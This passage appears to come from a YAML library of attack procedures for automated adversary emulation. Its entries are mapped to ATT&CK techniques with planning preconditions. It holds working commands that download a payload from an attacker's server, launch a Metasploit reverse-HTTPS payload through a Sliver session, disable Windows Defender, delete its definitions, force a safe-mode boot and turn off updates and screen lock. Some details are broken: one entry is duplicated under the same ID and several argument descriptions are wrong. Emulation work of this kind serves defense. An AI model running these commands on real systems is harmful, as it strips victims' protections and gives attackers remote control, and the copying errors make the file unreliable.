      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the file on the attacker's machine
        3. Download the file to #{PATH}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the downloaded payload
        type:
    preconditions:
      - (file_prepared_local ?file - file)
    effects:
      - (file_exists ?path - path ?file - file ?t - host)
  - uuid: 861580a4-aad7-4269-94ea-43f3f775423d
    name: Metasploit Payload Execution using Sliver
    id:
      - T1203
    source: Sliver
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Execution
    technique:
      - Exploitation for Client Execution
    description: The command is used within a Sliver session to execute a Metasploit
      payload in the current process. It allows users to specify various options such
      as the encoder type, number of encoding iterations, listening host and port,
      payload type, and command timeout. By default, it uses the "meterpreter_reverse_https"
      payload, listens on port 4444, and has a timeout of 60 seconds. This command
      is typically used for penetration testing and security assessments to deploy
      payloads on target systems.
    execution:
      executor: Sliver Executor
      command: |
        msf(#{SessionID}, #{Payload}, #{LHOST}, #{LPORT})
    arguments:
      SessionID:
        default:
        description: The session ID of the active Sliver connection.
        type:
      Payload:
        default:
        description: IP address of the attacker machine
        type:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: IP address of the attacker machine
        type:
    preconditions:
      - operator: or
        operands:
          - (os_windows ?t - host)
          - (os_linux ?t - host)
          - (os_macos ?t - host)
      - (sliver_session ?s - executor ?t - host)
    effects:
      - (MSF_payload_execution ?p - payload ?t - host)
  - uuid: 861580a4-aad7-4269-94ea-43f3f775423d
    name: Metasploit Payload Execution using Sliver
    id:
      - T1203
    source: Sliver
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Execution
    technique:
      - Exploitation for Client Execution
    description: The command is used within a Sliver session to execute a Metasploit
      payload in the current process. It allows users to specify various options such
      as the encoder type, number of encoding iterations, listening host and port,
      payload type, and command timeout. By default, it uses the "meterpreter_reverse_https"
      payload, listens on port 4444, and has a timeout of 60 seconds. This command
      is typically used for penetration testing and security assessments to deploy
      payloads on target systems.
    execution:
      executor: Sliver Executor
      command: |
        msf(#{SessionID}, #{Payload}, #{LHOST}, #{LPORT})
    arguments:
      SessionID:
        default:
        description: The session ID of the active Sliver connection.
        type:
      Payload:
        default:
        description: IP address of the attacker machine
        type:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: IP address of the attacker machine
        type:
    preconditions:
      - operator: or
        operands:
          - (os_windows ?t - host)
          - (os_linux ?t - host)
          - (os_macos ?t - host)
      - (sliver_session ?s - executor ?t - host)
    effects:
      - (MSF_payload_execution ?p - payload ?t - host)
  - uuid: 7bfba376-cebc-4094-b1e6-5103b2e83c4e
    name: Execute PowerShell Command
    id:
      - T1059.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - |
        Command and Scripting Interpreter: PowerShell
    description: The `powershell.exe` command executes a PowerShell script or command
      on the remote host. This command is useful for performing system monitoring
      tasks or gathering information about the processes running on a remote machine.
    execution:
      executor: Sliver Executor
      command: powershell(#{SessionID},#{Commands})
    arguments:
      SessionID:
        description: The session ID of the active Sliver connection.
    preconditions:
      - (os_windows ?t - host)
      - (sliver_session ?s1 - executor ?t - host)
    effects:
      - (powershell ?s2 - executor ?t - host)
      - operator: When
        params:
          condition: (elevated_executor ?s1 - executor)
          effect: (elevated_executor ?s2 - executor)
  - uuid: 6b8df440-51ec-4d53-bf83-899591c9b5d7
    name: Tamper with Windows Defender ATP PowerShell
    id:
      - T1562.001
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - 'Impair Defenses: Disable or Modify Tools'
    description: |
      Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled
      in Windows settings.
    execution:
      executor: Elevated Powershell Executor
      command: |
        Set-MpPreference -DisableRealtimeMonitoring 1
        Set-MpPreference -DisableBehaviorMonitoring 1
        Set-MpPreference -DisableScriptScanning 1
        Set-MpPreference -DisableBlockAtFirstSeen 1
    arguments:
    dependencies:
    preconditions:
      - (powershell ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (virus_and_threat_protection_disabled ?target - host)
  - uuid: 2a78362e-b79a-4482-8e24-be397bce4d85
    name: Safe Mode Boot
    id:
      - T1562.009
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - 'Impair Defenses: Safe Mode Boot'
    description: Allows adversaries to abuse safe mode to disable endpoint defenses
      that may not start with limited boot
    execution:
      executor: Elevated Command Prompt Executor
      command: bcdedit /set safeboot network
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (endpoint_defense_disabled ?target - host)
  - uuid: 01b20ca8-c7a3-4d86-af59-059f15ed5474
    name: Disable Windows OS Auto Update
    id:
      - T1112
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - Modify Registry
    description: |
      Disable Auto Update Windows OS feature. Redline is using this as part of its defense evasion.
    execution:
      executor: Elevated Command Prompt Executor
      command: |
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d 1 /f
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (auto_update_disabled ?target - host)
  - uuid: 3dacb0d2-46ee-4c27-ac1b-f9886bf91a56
    name: Disable Windows Lock Workstation Feature
    id:
      - T1112
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - Modify Registry
    description: |
      Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows Lock workstation feature.
      See how ransomware abuses this technique- https://www.bleepingcomputer.com/news/security/in-dev-ransomware-forces-you-do-to-survey-before-unlocking-computer/
    execution:
      executor: Elevated Command Prompt Executor
      command: |
        reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (lock_workstation_disabled ?target - host)
  - uuid: 3d47daaa-2f56-43e0-94cc-caf5d8d52a68
    name: Remove Windows Defender Definition Files
    id:
      - T1562.001
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - 'Impair Defenses: Disable or Modify Tools'
    description: |
      Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.
      On later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the
      command will say completed.

      https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/
    execution:
      executor: Elevated Command Prompt Executor
      command: |
        "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (anti_malware_disabled ?target - host)
testbed_requirement:
  host11:
    os: windows
    cve: []
